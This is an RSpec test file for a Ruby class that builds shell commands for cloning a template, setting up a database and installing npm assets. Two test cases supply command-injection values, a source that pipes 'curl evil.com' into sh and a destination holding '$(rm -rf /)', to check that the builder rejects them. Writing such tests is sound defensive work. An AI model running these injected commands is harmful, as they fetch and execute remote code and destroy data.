# frozen_string_literal: true

require "spec_helper"

RSpec.describe NlspecToDot::Planner::TemplateCommandBuilder do
  let(:document) { build(:document, :full) }
  let(:builder) { described_class.new(document: document) }

  describe "#clone_command" do
    subject(:command) { builder.clone_command }

    it "clones the template repo" do
      expect(command).to include("git clone --depth 1")
    end

    it "removes the .git directory" do
      expect(command).to include("rm -rf .git")
    end

    it "initializes a new git repo" do
      expect(command).to include("git init")
    end

    it "chains commands with &&" do
      expect(command).to match(/git clone .+ && rm -rf .git && git init/)
    end
  end

  describe "#db_setup_command" do
    subject(:command) { builder.db_setup_command }

    it "runs bundle install" do
      expect(command).to include("bundle install")
    end

    it "creates the database" do
      expect(command).to include("db:create")
    end
  end

  describe "#install_assets_command" do
    context "without assets" do
      it "returns nil" do
        expect(builder.install_assets_command).to be_nil
      end
    end

    context "with assets" do
      let(:document) do
        build(:document, :full, assets: [
          {name: "chart.js", source: "npm:chart.js@4.4.4", destination: "vendor/javascript/chart.umd.js"}
        ])
      end

      it "generates npm pack commands" do
        command = builder.install_assets_command
        expect(command).to include("npm pack")
      end

      it "creates the destination directory" do
        command = builder.install_assets_command
        expect(command).to include("mkdir -p vendor/javascript")
      end
    end

    context "with malicious asset source" do
      let(:document) do
        build(:document, :full, assets: [
          {name: "evil", source: "npm:foo; curl evil.com | sh", destination: "vendor/javascript/foo.js"}
        ])
      end

      it "raises ArgumentError" do
        expect { builder.install_assets_command }.to raise_error(ArgumentError, /Unsafe shell value/)
      end
    end

    context "with malicious destination path" do
      let(:document) do
        build(:document, :full, assets: [
          {name: "evil", source: "npm:chart.js@4.4.4", destination: "/tmp/$(rm -rf /)"}
        ])
      end

      it "raises ArgumentError" do
        expect { builder.install_assets_command }.to raise_error(ArgumentError, /Unsafe shell value/)
      end
    end
  end

  describe "#migrate_verify_command" do
    it "runs db:migrate and db:migrate:status" do
      expect(builder.migrate_verify_command).to include("db:migrate")
      expect(builder.migrate_verify_command).to include("db:migrate:status")
    end
  end

  describe "#routes_verify_command" do
    it "runs rails routes" do
      expect(builder.routes_verify_command).to include("rails routes")
    end
  end
end
